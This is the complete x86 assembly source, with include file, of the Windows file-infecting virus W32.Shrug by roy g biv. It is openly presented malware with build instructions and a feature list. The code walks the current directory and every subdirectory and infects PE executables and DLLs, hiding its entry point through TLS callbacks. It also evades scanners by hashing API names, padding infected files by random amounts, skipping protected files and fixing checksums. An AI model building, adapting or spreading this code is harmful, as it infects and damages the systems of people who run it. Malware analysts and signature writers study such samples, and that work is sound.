
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[SHRUG.ASM]컴�
comment ;)
W32.Shrug by roy g biv

some of its features:
- parasitic direct action infector of PE exe/dll (but not looking at suffix)
- infects files in current directory and all subdirectories
- directory traversal is linked-list instead of recursive to reduce stack size
- reloc section inserter/last section appender
- mixture of EPO and standard transfer of control:
        TLS infection (but runs only under NT/2000/XP)
        altered entry point field in DLLs (all platforms)
        code executes after ExitProcess() is called
- auto function type selection (Unicode under NT/2000/XP, ANSI under 9x/Me)
- uses CRCs instead of API names
- uses SEH for common code exit
- section attributes are not always altered (virus is not self-modifying)
- no infect files with data outside of image (eg self-extractors)
- no infect files protected by SFC/SFP (including under Windows XP)
- infected files are padded by random amounts to confuse tail scanners
- uses SEH walker to find kernel address (no hard-coded addresses)
- correct file checksum without using imagehlp.dll :) 100% correct algorithm
- plus some new code optimisations that were never seen before
---

  optimisation tip: Windows appends ".dll" automatically, so this works:
        push "cfs"
        push esp
        call LoadLibraryA
---

to build this thing:
tasm
----
tasm32 /ml /m3 shrug
tlink32 /B:400000 /x shrug,,,import32

Virus is not self-modifying, so no need to alter section attributes
---

We're in the middle of a phase transition:
a butterfly flapping its wings at
just the right moment could
cause a storm to happen.
-I'm trying to understand-
I'm at a moment in my life-
I don't know where to flap my wings.
(Danny Hillis)

(;

.386
.model  flat

extern  GetCurrentProcess:proc
extern  WriteProcessMemory:proc
extern  MessageBoxA:proc
extern  ExitProcess:proc

.data

;must be reverse alphabetical order because they are stored on stack
;API names are not present in replications, only in dropper

krnnames        db      "UnmapViewOfFile"     , 0
                db      "SetFileTime"         , 0
                db      "SetFileAttributesW"  , 0
                db      "SetFileAttributesA"  , 0
                db      "SetCurrentDirectoryW", 0
                db      "SetCurrentDirectoryA", 0
                db      "MultiByteToWideChar" , 0
                db      "MapViewOfFile"       , 0
                db      "LoadLibraryA"        , 0
                db      "GlobalFree"          , 0
                db      "GlobalAlloc"         , 0
                db      "GetVersion"          , 0
                db      "GetTickCount"        , 0
                db      "GetFullPathNameW"    , 0
                db      "GetFullPathNameA"    , 0
                db      "FindNextFileW"       , 0
                db      "FindNextFileA"       , 0
                db      "FindFirstFileW"      , 0
                db      "FindFirstFileA"      , 0
                db      "FindClose"           , 0
                db      "CreateFileW"         , 0
                db      "CreateFileMappingA"  , 0
                db      "CreateFileA"         , 0
                db      "CloseHandle"         , 0

sfcnames        db      "SfcIsFileProtected", 0

txttitle        db      "Shrug", 0
txtbody         db      "running...", 0

include shrug.inc

.code
assume fs:nothing

dropper         label   near
        mov     edx, krncrc_count
        mov     ebx, offset krnnames
        mov     edi, offset krncrcbegin
        call    create_crcs
        mov     edx, 1
        mov     ebx, offset sfcnames
        mov     edi, offset sfccrcbegin
        call    create_crcs
        call    patch_host
        xor     ebx, ebx
        push    ebx
        push    offset txttitle
        push    offset txtbody
        push    ebx
        call    MessageBoxA
        push    ebx
        call    ExitProcess

create_crcs     proc    near
        imul    ebp, edx, 4

create_loop     label   near
        or      eax, -1

create_outer    label   near
        xor     al, byte ptr [ebx]
        push    8
        pop     ecx

create_inner    label   near
        add     eax, eax
        jnb     create_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

create_skip     label   near
        loop    create_inner
        sub     cl, byte ptr [ebx]              ;carry set if not zero
        inc     ebx                             ;carry not altered by inc
        jb      create_outer
        push    eax
        dec     edx
        jne     create_loop
        mov     eax, esp
        push    ecx
        push    ebp
        push    eax
        push    edi
        call    GetCurrentProcess
        push    eax
        xchg    esi, eax
        call    WriteProcessMemory
        add     esp, ebp
        ret
create_crcs     endp

patch_host      label   near
        pop     ecx
        push    ecx
        call    $ + 5
        pop     eax
        add     eax, offset tlsdata - offset $ + 1
        sub     ecx, eax
        push    ecx
        mov     eax, esp
        xor     edi, edi
        push    edi
        push    4
        push    eax
        push    offset host_patch + 3
        push    esi
        call    WriteProcessMemory
        push    edi                             ;fake Reserved
        push    edi                             ;fake Reason
        push    edi                             ;fake DLLHandle
        push    edi                             ;fake return address
;-----------------------------------------------------------------------------
;everything before this point is dropper code
;-----------------------------------------------------------------------------

;-----------------------------------------------------------------------------
;virus code begins here in dlls (always) and exes (existing TLS callback pointer)
;-----------------------------------------------------------------------------

shrug_tlscode   proc    near
        mov     eax, dword ptr [esp + initstk.initReason]
        push    eax                             ;fake Reserved
        push    eax                             ;real Reason
        push    eax                             ;fake DLLHandle
        call    host_patch                      ;real return address

tlsdata         tlsstruc <0>                    ;label required for delta offset

;-----------------------------------------------------------------------------
;moved label after some data because "e800000000" looks like virus code ;)
;and it's not used for delta offset calculation, but for original entry point
;-----------------------------------------------------------------------------

host_patch      label   near
        add     dword ptr [esp], '!bgr'

;-----------------------------------------------------------------------------
;virus code begins here in exes (created TLS directory / callback pointer)
;-----------------------------------------------------------------------------

shrug_dllcode   proc    near                    ;stack = DllHandle, Reason, Reserved
        test    byte ptr [esp + initstk.initReason], DLL_PROCESS_ATTACH or DLL_THREAD_ATTACH
        jne     shrug_dllret                    ;kernel32 not in SEH chain on ATTACH messages
        pushad
        call    shrug_common
        mov     esp, dword ptr [esp + sehstruc.sehprevseh]
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad

shrug_dllret    label   near
        ret     0ch

;-----------------------------------------------------------------------------
;main virus body.  everything happens in here
;-----------------------------------------------------------------------------

shrug_common    proc    near
        xor     esi, esi
        lods    dword ptr fs:[esi]
        push    eax
        mov     dword ptr fs:[esi - 4], esp
        inc     eax

walk_seh        label   near
        dec     eax
        xchg    esi, eax
        lods    dword ptr [esi]
        inc     eax
        jne     walk_seh
        enter   (size findlist - 5) and -4, 0   ;Windows NT/2000/XP enables alignment check exception
                                                ;so some APIs fail if buffer is not dword aligned
                                                ;-5 to align at 2 dwords earlier
                                                ;because EBP saved automatically
                                                ;and other register saved next
        push    eax                             ;zero findprev in findlist
        lods    dword ptr [esi]
        call    init_findmz

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

krncrcbegin     label   near                    ;place < 80h bytes from call for smaller code
        dd      (krncrc_count + 1) dup (0)
krncrcend       label   near
        dd      offset check_sfc - offset krncrcend + 4
        db      "Shrug - roy g biv"             ;your guess is as good as mine

init_findmz     label   near
        inc     eax
        xchg    edi, eax

find_mzhdr      label   near

;-----------------------------------------------------------------------------
;do not use hard-coded kernel address values because it is not portable
;Microsoft used all different values for 95, 98, NT, 2000, Me, XP
;they will maybe change again for every new release
;-----------------------------------------------------------------------------

        dec     edi                             ;sub 64kb
        xor     di, di                          ;64kb align
        call    is_pehdr
        jne     find_mzhdr
        mov     ebx, edi
        pop     edi

;-----------------------------------------------------------------------------
;parse export table
;-----------------------------------------------------------------------------

        mov     esi, dword ptr [esi + pehdr.peexport.dirrva - pehdr.pecoff]
        lea     esi, dword ptr [ebx + esi + peexp.expadrrva]
        lods    dword ptr [esi]                 ;Export Address Table RVA
        lea     edx, dword ptr [ebx + eax]
        lods    dword ptr [esi]                 ;Name Pointer Table RVA
        lea     ecx, dword ptr [ebx + eax]
        lods    dword ptr [esi]                 ;Ordinal Table RVA
        lea     ebp, dword ptr [ebx + eax]
        mov     esi, ecx

push_export     label   near
        push    ecx

get_export      label   near
        lods    dword ptr [esi]
        push    ebx
        add     ebx, eax                        ;Name Pointer VA
        or      eax, -1

crc_outer       label   near
        xor     al, byte ptr [ebx]
        push    8
        pop     ecx

crc_inner       label   near
        add     eax, eax
        jnb     crc_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

crc_skip        label   near
        loop    crc_inner
        sub     cl, byte ptr [ebx]              ;carry set if not zero
        inc     ebx                             ;carry not altered by inc
        jb      crc_outer
        pop     ebx
        cmp     dword ptr [edi], eax
        jne     get_export

;-----------------------------------------------------------------------------
;exports must be sorted alphabetically, otherwise GetProcAddress() would fail
;this allows to push addresses onto the stack, and the order is known
;-----------------------------------------------------------------------------

        pop     ecx
        mov     eax, esi
        sub     eax, ecx                        ;Name Pointer Table VA
        shr     eax, 1
        movzx   eax, word ptr [ebp + eax - 2]   ;get export ordinal
        mov     eax, dword ptr [eax * 4 + edx]  ;get export RVA
        add     eax, ebx
        push    eax
        scas    dword ptr [edi]
        cmp     dword ptr [edi], 0
        jne     push_export
        add     edi, dword ptr [edi + 4]
        jmp     edi

;-----------------------------------------------------------------------------
;get SFC support if available
;-----------------------------------------------------------------------------

check_sfc       label   near
        call    load_sfc
        db      "sfc_os", 0                     ;Windows XP (forwarder chain from sfc.dll)

load_sfc        label   near
        call    dword ptr [esp + krncrcstk.kLoadLibraryA]
        test    eax, eax
        jne     found_sfc
        push    'cfs'                           ;Windows Me/2000
        push    esp
        call    dword ptr [esp + 4 + krncrcstk.kLoadLibraryA]
        pop     ecx
        test    eax, eax
        je      sfcapi_push

found_sfc       label   near
        call    init_findmz

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

sfccrcbegin     label   near                    ;place < 80h bytes from call for smaller code
        dd      0, 0
sfccrcend       label   near
        dd      offset swap_create - offset sfccrcend + 4

sfcapi_push     label   near
        push    eax

swap_create     label   near

;-----------------------------------------------------------------------------
;swap CreateFileW and CreateFileMappingA because of alphabet order
;-----------------------------------------------------------------------------

        mov     ebx, esp
        mov     eax, dword ptr [ebx + krncrcstk.kCreateFileMappingA]
        xchg    dword ptr [ebx + krncrcstk.kCreateFileW], eax
        mov     dword ptr [ebx + krncrcstk.kCreateFileMappingA], eax

;-----------------------------------------------------------------------------
;determine platform and dynamically select function types (ANSI or Unicode)
;so for Windows NT/2000/XP this code handles files that no ANSI function can open
;-----------------------------------------------------------------------------

        call    dword ptr [ebx + krncrcstk.kGetVersion]
        shr     eax, 1fh                        ;treat 9x and Win32s as ANSI
                                                ;safer than using AreFileApisANSI()
        lea     ebp, dword ptr [eax * 4 + ebx]
        lea     esi, dword ptr [ebx + size krncrcstk]

;-----------------------------------------------------------------------------
;non-recursive directory traverser
;-----------------------------------------------------------------------------

scan_dir        proc    near                    ;ebp -> platform APIs, esi -> findlist
        push    '*'                             ;ANSI-compatible Unicode findmask
        mov     eax, esp
        lea     ebx, dword ptr [esi + findlist.finddata]
        push    ebx
        push    eax
        call    dword ptr [ebp + krncrcstk.kFindFirstFileW]
        pop     ecx
        mov     dword ptr [esi + findlist.findhand], eax
        inc     eax
        je      find_prev

        ;you must always step forward from where you stand

test_dirfile    label   near
        mov     eax, dword ptr [ebx + WIN32_FIND_DATA.dwFileAttributes]
        lea     edi, dword ptr [esi + findlist.finddata.cFileName]
        test    al, FILE_ATTRIBUTE_DIRECTORY
        je      test_file
        cmp     byte ptr [edi], '.'             ;ignore . and .. (but also .* directories under NT/2000/XP)
        je      find_next

;-----------------------------------------------------------------------------
;enter subdirectory, and allocate another list node
;-----------------------------------------------------------------------------

        push    edi
        call    dword ptr [ebp + krncrcstk.kSetCurrentDirectoryW]
        xchg    ecx, eax
        jecxz   find_next
        push    size findlist
        push    GMEM_FIXED
        call    dword ptr [esp + krncrcstk.kGlobalAlloc + 8]
        xchg    ecx, eax
        jecxz   step_updir
        xchg    esi, ecx
        mov     dword ptr [esi + findlist.findprev], ecx
        jmp     scan_dir

find_next       label   near
        lea     ebx, dword ptr [esi + findlist.finddata]
        push    ebx
        mov     edi, dword ptr [esi + findlist.findhand]
        push    edi
        call    dword ptr [ebp + krncrcstk.kFindNextFileW]
        test    eax, eax
        jne     test_dirfile

;-----------------------------------------------------------------------------
;close find, and free list node if not list head
;-----------------------------------------------------------------------------

        mov     ebx, esp
        push    edi
        call    dword ptr [ebx + krncrcstk.kFindClose]

find_prev       label   near
        mov     ecx, dword ptr [esi + findlist.findprev]
        jecxz   shrug_exit
        push    esi
        mov     esi, ecx
        call    dword ptr [ebx + krncrcstk.kGlobalFree]

step_updir      label   near

;-----------------------------------------------------------------------------
;the ANSI string ".." can be used, even on Unicode platforms
;-----------------------------------------------------------------------------

        push    '..'
        org     $ - 1                           ;select top 8 bits of push
shrug_exit      label   near
        int     3                               ;game over

        push    esp
        call    dword ptr [ebx + krncrcstk.kSetCurrentDirectoryA]
        pop     eax
        jmp     find_next

test_file       label   near

;-----------------------------------------------------------------------------
;get full path and convert to Unicode if required (SFC requires Unicode path)
;-----------------------------------------------------------------------------

        push    eax                             ;save original file attributes for close
        mov     eax, ebp
        enter   MAX_PATH * 2, 0
        mov     ecx, esp
        push    eax
        push    esp
        push    ecx
        push    MAX_PATH
        push    edi
        call    dword ptr [eax + krncrcstk.kGetFullPathNameW]
        xchg    edi, eax
        pop     eax
        xor     ebx, ebx
        call    dword ptr [ebp + 8 + krncrcstk.kGetVersion]
        test    eax, eax
        jns     call_sfcapi
        mov     ecx, esp
        xchg    ebp, eax
        enter   MAX_PATH * 2, 0
        xchg    ebp, eax
        mov     eax, esp
        push    MAX_PATH
        push    eax
        inc     edi
        push    edi
        push    ecx
        push    ebx                             ;use default translation
        push    ebx                             ;CP_ANSI
        call    dword ptr [ebp + 8 + krncrcstk.kMultiByteToWideChar]

call_sfcapi     label   near

;-----------------------------------------------------------------------------
;don't touch protected files
;-----------------------------------------------------------------------------

        mov     ecx, dword ptr [ebp + 8 + krncrcstk.kSfcIsFileProtected]
        xor     eax, eax                        ;fake success in case of no SFC
        jecxz   leave_sfc
        push    esp
        push    ebx
        call    ecx

leave_sfc       label   near
        leave
        test    eax, eax
        jne     restore_attr
        call    set_fileattr
        push    ebx
        push    ebx
        push    OPEN_EXISTING
        push    ebx
        push    ebx
        push    GENERIC_READ or GENERIC_WRITE
        push    edi
        call    dword ptr [ebp + krncrcstk.kCreateFileW]
        xchg    ebx, eax
        call    test_infect
        db      81h                             ;mask CALL
        call    infect_file                     ;Super Nashwan power ;)

close_file      label   near                    ;label required for delta offset
        lea     eax, dword ptr [esi + findlist.finddata.ftLastWriteTime]
        push    eax
        sub     eax, 8
        push    eax
        sub     eax, 8
        push    eax
        push    ebx
        call    dword ptr [esp + 4 + krncrcstk.kSetFileTime + 10h]
        push    ebx
        call    dword ptr [esp + 4 + krncrcstk.kCloseHandle + 4]

restore_attr    label   near
        pop     ebx                             ;restore original file attributes
        call    set_fileattr
        jmp     find_next
scan_dir        endp

;-----------------------------------------------------------------------------
;look for MZ and PE file signatures
;-----------------------------------------------------------------------------

is_pehdr        proc    near                    ;edi -> map view
        cmp     word ptr [edi], 'ZM'            ;Windows does not check 'MZ'
        jne     pehdr_ret
        mov     esi, dword ptr [edi + mzhdr.mzlfanew]
        add     esi, edi
        lods    dword ptr [esi]                 ;SEH protects against bad lfanew value
        add     eax, -'EP'                      ;anti-heuristic test filetype ;) and clear EAX

pehdr_ret       label   near
        ret                                     ;if PE file, then eax = 0, esi -> COFF header, Z flag set
is_pehdr        endp

;-----------------------------------------------------------------------------
;reset/set read-only file attribute
;-----------------------------------------------------------------------------

set_fileattr    proc    near                    ;ebx = file attributes, esi -> findlist, ebp -> platform APIs
        push    ebx
        lea     edi, dword ptr [esi + findlist.finddata.cFileName]
        push    edi
        call    dword ptr [ebp + krncrcstk.kSetFileAttributesW]
        ret                                     ;edi -> filename
        db      "01/01/01"                      ;01 Janvier, 1901 - the old joke
set_fileattr    endp

;-----------------------------------------------------------------------------
;test if file is infectable (not protected, PE, x86, non-system, not infected, etc)
;-----------------------------------------------------------------------------

test_infect     proc    near                    ;esi = find data, edi = map view, ebp -> platform APIs
        call    map_view
        mov     ebp, esi
        call    is_pehdr
        jne     inftest_ret
        lods    dword ptr [esi]
        cmp     ax, IMAGE_FILE_MACHINE_I386
        jne     inftest_ret                     ;only Intel 386+
        shr     eax, 0dh                        ;move high 16 bits into low 16 bits and multiply by 8
        lea     edx, dword ptr [eax * 4 + eax]  ;complete multiply by 28h (size pesect)
        mov     ecx, dword ptr [esi + pehdr.pecoff.peflags - pehdr.pecoff.petimedate]

;-----------------------------------------------------------------------------
;IMAGE_FILE_BYTES_REVERSED_* bits are rarely set correctly, so do not test them
;-----------------------------------------------------------------------------

        test    ch, (IMAGE_FILE_SYSTEM or IMAGE_FILE_UP_SYSTEM_ONLY) shr 8
        jne     inftest_ret
        add     esi, pehdr.peentrypoint - pehdr.pecoff.petimedate

;-----------------------------------------------------------------------------
;if file is a .dll, then we require an entry point function
;-----------------------------------------------------------------------------

        lods    dword ptr [esi]
        xchg    ecx, eax
        test    ah, IMAGE_FILE_DLL shr 8
        je      test_system
        jecxz   inftest_ret

;-----------------------------------------------------------------------------
;32-bit executable file...
;-----------------------------------------------------------------------------

test_system     label   near
        and     ax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_32BIT_MACHINE
        cmp     ax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_32BIT_MACHINE
        jne     inftest_ret                     ;cannot use xor+jpo because 0 is also jpe

;-----------------------------------------------------------------------------
;the COFF magic value is not checked because Windows ignores it anyway
;IMAGE_FILE_MACHINE_IA64 machine type is the only reliable way to detect PE32+
;-----------------------------------------------------------------------------

        mov     eax, dword ptr [esi + pehdr.pesubsys - pehdr.pecodebase]
        cmp     ax, IMAGE_SUBSYSTEM_WINDOWS_CUI
        jnbe    inftest_ret
        cmp     al, IMAGE_SUBSYSTEM_WINDOWS_GUI ;al not ax, because ah is known now to be 0
        jb      inftest_ret
        shr     eax, 1eh                        ;test eax, IMAGE_DLLCHARACTERISTICS_WDM_DRIVER shl 10h
        jb      inftest_ret

;-----------------------------------------------------------------------------
;avoid files which seem to contain attribute certificates
;because one of those certificates might be a digital signature
;-----------------------------------------------------------------------------

        cmp     dword ptr [esi + pehdr.pesecurity.dirrva - pehdr.pecodebase], 0
        jne     inftest_ret

;-----------------------------------------------------------------------------
;cannot use the NumberOfRvaAndSizes field to calculate the Optional Header size
;the Optional Header can be larger than the offset of the last directory
;remember: even if you have not seen it does not mean that it does not happen :)
;-----------------------------------------------------------------------------

        movzx   eax, word ptr [esi + pehdr.pecoff.peopthdrsize - pehdr.pecodebase]
        add     eax, edx
        lea     esi, dword ptr [esi + eax - pehdr.pecodebase + pehdr.pemagic - size pesect + pesect.sectrawsize]
        lods    dword ptr [esi]
        add     eax, dword ptr [esi]
        cmp     dword ptr [ebp + findlist.finddata.dwFileSizeLow], eax
        jne     inftest_ret                     ;file contains appended data
        inc     dword ptr [esp + mapsehstk.mapsehinfret]
                                                ;skip call mask

inftest_ret     label   near
        int     3

;-----------------------------------------------------------------------------
;increase file size by random value (between RANDPADMIN and RANDPADMAX bytes)
;I use GetTickCount() instead of RDTSC because RDTSC can be made privileged
;-----------------------------------------------------------------------------

open_append     proc    near
        call    dword ptr [esp + size mapstack - 4 + krncrcstk.kGetTickCount]
        and     eax, RANDPADMAX - 1
        add     ax, small (offset shrug_codeend - offset shrug_tlscode + RANDPADMIN)

;-----------------------------------------------------------------------------
;create file map, and map view if successful
;-----------------------------------------------------------------------------

map_view        proc    near                    ;eax = extra bytes to map, ebx = file handle, esi -> findlist, ebp -> platform APIs
        add     eax, dword ptr [esi + findlist.finddata.dwFileSizeLow]
        xor     ecx, ecx
        push    eax
        mov     edx, esp
        push    eax                             ;MapViewOfFile
        push    ecx                             ;MapViewOfFile
        push    ecx                             ;MapViewOfFile
        push    FILE_MAP_WRITE                  ;Windows 9x/Me does not support FILE_MAP_ALL_ACCESS
        push    ecx
        push    eax
        push    ecx
        push    PAGE_READWRITE
        push    ecx
        push    ebx
        call    dword ptr [edx + size mapstack + krncrcstk.kCreateFileMappingA]
                                                ;ANSI map is allowed because of no name
        push    eax
        xchg    edi, eax
        call    dword ptr [esp + size mapstack + krncrcstk.kMapViewOfFile + 14h]
        pop     ecx
        xchg    edi, eax                        ;should succeed even if file cannot be opened
        pushad
        call    unmap_seh
        mov     esp, dword ptr [esp + sehstruc.sehprevseh]
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad                                   ;SEH destroys all registers
        push    eax
        push    edi
        call    dword ptr [esp + size mapstack + krncrcstk.kUnmapViewOfFile + 4]
        call    dword ptr [esp + size mapstack + krncrcstk.kCloseHandle]
        pop     eax
        ret

unmap_seh       proc    near
        cdq
        push    dword ptr fs:[edx]
        mov     dword ptr fs:[edx], esp
        jmp     dword ptr [esp + mapsehstk.mapsehsehret]
unmap_seh       endp
map_view        endp                            ;eax = map handle, ecx = new file size, edi = map view
open_append     endp

;-----------------------------------------------------------------------------
;infect file using a selection of styles for variety
;algorithm:     increase file size by random amount (RANDPADMIN-RANDPADMAX
;               bytes) to confuse scanners that look at end of file (also
;               infection marker)
;               if reloc table is not in last section (taken from relocation
;               field in PE header, not section name), then append to last
;               section.  otherwise, move relocs down and insert code into
;               space (to confuse people looking at end of file.  they will
;               see only relocation data and garbage or many zeroes)
;DLL infection: entry point is altered to point to virus code.  very simple
;EXE infection: Entry Point Obscured via TLS callback function
;               if no TLS directory exists, then one will be created, with a
;               single callback function that points to this code
;               if a TLS directory exists, but no callback functions exist,
;               then a function pointer will be created that points to this
;               code
;               else if a TLS directory and callback functions exist, then the
;               first function pointer will be altered to point to this code
;-----------------------------------------------------------------------------

infect_file     label   near                    ;esi -> findlist, edi = map view
        call    open_append

delta_label     label   near
        push    ecx
        push    edi
        mov     ebx, dword ptr [edi + mzhdr.mzlfanew]
        lea     ebx, dword ptr [ebx + edi + pehdr.pechksum]
        movzx   eax, word ptr [ebx + pehdr.pecoff.pesectcount - pehdr.pechksum]
        imul    eax, eax, size pesect
        movzx   ecx, word ptr [ebx + pehdr.pecoff.peopthdrsize - pehdr.pechksum]
        add     eax, ecx
        lea     esi, dword ptr [ebx + eax + pehdr.pemagic - pehdr.pechksum - size pesect + pesect.sectrawsize]
        lods    dword ptr [esi]
        mov     cx, offset shrug_codeend - offset shrug_tlscode
        mov     edx, dword ptr [ebx + pehdr.pefilealign - pehdr.pechksum]
        push    eax
        add     eax, ecx
        dec     edx
        add     eax, edx
        not     edx
        and     eax, edx                        ;file align last section
        mov     dword ptr [esi + pesect.sectrawsize - pesect.sectrawaddr], eax

;-----------------------------------------------------------------------------
;raw size is file aligned.  virtual size is not required to be section aligned
;so if old virtual size is larger than new raw size, then size of image does
;not need to be updated, else virtual size must be large enough to cover the
;new code, and size of image is section aligned
;-----------------------------------------------------------------------------

        mov     ebp, dword ptr [esi + pesect.sectvirtaddr - pesect.sectrawaddr]
        cmp     dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr], eax
        jnb     test_reloff
        mov     dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr], eax
        add     eax, ebp
        mov     edx, dword ptr [ebx + pehdr.pesectalign - pehdr.pechksum]
        dec     edx
        add     eax, edx
        not     edx
        and     eax, edx
        mov     dword ptr [ebx + pehdr.peimagesize - pehdr.pechksum], eax

;-----------------------------------------------------------------------------
;if relocation table is not in last section, then append to last section
;otherwise, move relocations down and insert code into space
;-----------------------------------------------------------------------------

test_reloff     label   near
        test    byte ptr [ebx + pehdr.pecoff.peflags - pehdr.pechksum], IMAGE_FILE_RELOCS_STRIPPED
        jne     copy_code
        cmp     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], ebp
        jb      copy_code
        mov     eax, dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr]
        add     eax, ebp
        cmp     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], eax
        jnb     copy_code
        add     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], ecx
        pop     eax
        push    esi
        add     edi, dword ptr [esi]
        lea     esi, dword ptr [edi + eax - 1]
        lea     edi, dword ptr [esi + ecx]
        xchg    ecx, eax
        std
        rep     movs byte ptr [edi], byte ptr [esi]
        cld
        pop     esi
        pop     edi
        push    edi
        push    ecx
        xchg    ecx, eax

copy_code       label   near
        pop     edx
        add     ebp, edx
        xchg    ebp, eax
        add     edx, dword ptr [esi]
        add     edi, edx
        push    esi
        push    edi
        mov     esi, offset shrug_tlscode - offset delta_label
        add     esi, dword ptr [esp + infectstk.infseh.mapsehinfret]
                                                ;delta offset
        rep     movs byte ptr [edi], byte ptr [esi]
        pop     edi
        pop     esi

;-----------------------------------------------------------------------------
;always alter entry point of dlls
;-----------------------------------------------------------------------------

        test    byte ptr [ebx + pehdr.pecoff.peflags - pehdr.pechksum + 1], IMAGE_FILE_DLL shr 8
        je      test_tlsdir
        lea     edx, dword ptr [ebx + pehdr.peentrypoint - pehdr.pechksum]

alter_func      label   near
        xchg    dword ptr [edx], eax
        sub     eax, offset tlsdata - offset shrug_tlscode
        sub     eax, dword ptr [edx]
        mov     dword ptr [edi + offset host_patch - offset shrug_tlscode + 3], eax
        jmp     checksum_file

;-----------------------------------------------------------------------------
;if tls directory exists...
;-----------------------------------------------------------------------------

test_tlsdir     label   near
        mov     ecx, dword ptr [ebx + pehdr.petls.dirrva - pehdr.pechksum]
        jecxz   add_tlsdir                      ;size field is never checked
        call    rva2raw
        pop     edx
        push    edx
        add     eax, dword ptr [ebx + pehdr.peimagebase - pehdr.pechksum]
        push    eax
        lea     eax, dword ptr [edx + ecx + tlsstruc.tlsfuncptr]
        mov     ecx, dword ptr [eax]
        jecxz   store_func
        sub     ecx, dword ptr [ebx + pehdr.peimagebase - pehdr.pechksum]
        call    rva2raw
        add     edx, ecx                        ;do not combine
        mov     ecx, dword ptr [edx]            ;current edx used by alter_func

        ;it is impossible if it passes unattempted

store_func      label   near
        test    ecx, ecx
        pop     ecx
        xchg    ecx, eax
        jne     alter_func
        add     eax, offset tlsdata.tlsfunc - offset shrug_tlscode
        mov     dword ptr [ecx], eax
        add     edi, offset tlsdata.tlsfiller - offset shrug_tlscode
        jmp     set_funcptr

;-----------------------------------------------------------------------------
;the only time that the section attributes are altered is when a TLS directory
;is created.  at that time, a writable dword must be available for the index.
;the alternative is to search for a writable section with virtual size > raw
;size, set index pointer to that address and reinitialise it to zero in code
;-----------------------------------------------------------------------------

add_tlsdir      label   near
        or      byte ptr [esi + pesect.sectflags - pesect.sectrawaddr + 3], IMAGE_SCN_MEM_WRITE shr 18h
        add     eax, offset tlsdata - offset shrug_tlscode
        mov     dword ptr [ebx + pehdr.petls.dirrva - pehdr.pechksum], eax
        add     eax, dword ptr [ebx + pehdr.peimagebase - pehdr.pechksum]
        add     eax, offset tlsdata.tlsflags - offset tlsdata
        add     edi, offset tlsdata.tlsindex - offset shrug_tlscode
        stos    dword ptr [edi]
        add     eax, offset tlsdata.tlsfunc - offset tlsdata.tlsflags
        stos    dword ptr [edi]

set_funcptr     label   near
        scas    dword ptr [edi]
        scas    dword ptr [edi]
        add     eax, offset shrug_dllcode - offset tlsdata.tlsfunc
        stos    dword ptr [edi]

checksum_file   label   near
        pop     edi

;-----------------------------------------------------------------------------
;CheckSumMappedFile() - simply sum of all words in file, then adc filesize
;-----------------------------------------------------------------------------

        xor     ecx, ecx
        xchg    dword ptr [ebx], ecx
        jecxz   infect_ret
        xor     eax, eax
        pop     ecx
        push    ecx
        inc     ecx
        shr     ecx, 1
        clc

calc_checksum   label   near
        adc     ax, word ptr [edi]
        inc     edi
        inc     edi
        loop    calc_checksum
        pop     dword ptr [ebx]
        adc     dword ptr [ebx], eax            ;avoid common bug.  ADC not ADD

infect_ret      label   near
        int     3                               ;common exit using SEH
        db      "*4U2NV*"                       ;that is, unless you're reading this
test_infect     endp

;-----------------------------------------------------------------------------
;convert relative virtual address to raw file offset
;-----------------------------------------------------------------------------

rvaloop         label   near
        sub     esi, size pesect
        cmp     al, 'R'                         ;mask PUSH ESI
        org     $ - 1
rva2raw         proc    near                    ;ecx = RVA, esi -> last section header
        push    esi
        cmp     dword ptr [esi + pesect.sectvirtaddr - pesect.sectrawaddr], ecx
        jnbe    rvaloop
        sub     ecx, dword ptr [esi + pesect.sectvirtaddr - pesect.sectrawaddr]
        add     ecx, dword ptr [esi]
        pop     esi
        ret
rva2raw        endp

        ;When last comes to last,
        ;  I have little power:
        ;  I am merely an urn.
        ;I hold the bone-sap of myself,
        ;  And watch the marrow burn.
        ;
        ;When last comes to last,
        ;  I have little strength:
        ;  I am only a tool.
        ;I work its work; and in its hands
        ;  I am the fool.
        ;
        ;When last comes to last,
        ;  I have little life.
        ;  I am simply a deed:
        ;an action done while courage holds:
        ;  A seed.
        ;(Stephen Donaldson)

shrug_codeend   label   near
shrug_common    endp
shrug_dllcode   endp
shrug_tlscode   endp
end             dropper
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[SHRUG.ASM]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[SHRUG.INC]컴�
MAX_PATH                        equ     260

DLL_PROCESS_ATTACH              equ     1
DLL_THREAD_ATTACH               equ     2

FILE_ATTRIBUTE_DIRECTORY        equ     00000010h
FILE_ATTRIBUTE_NORMAL           equ     00000080h
FILE_FLAG_RANDOM_ACCESS         equ     10000000h

GMEM_FIXED                      equ     0000h

OPEN_EXISTING                   equ     3

GENERIC_WRITE                   equ     40000000h
GENERIC_READ                    equ     80000000h

IMAGE_FILE_MACHINE_I386         equ     14ch    ;14d/14e do not exist.  if you don't believe, then try it

IMAGE_FILE_RELOCS_STRIPPED      equ     0001h
IMAGE_FILE_EXECUTABLE_IMAGE     equ     0002h
IMAGE_FILE_32BIT_MACHINE        equ     0100h
IMAGE_FILE_SYSTEM               equ     1000h
IMAGE_FILE_DLL                  equ     2000h
IMAGE_FILE_UP_SYSTEM_ONLY       equ     4000h

IMAGE_SUBSYSTEM_WINDOWS_GUI     equ     2
IMAGE_SUBSYSTEM_WINDOWS_CUI     equ     3

IMAGE_SCN_MEM_WRITE             equ     80000000h

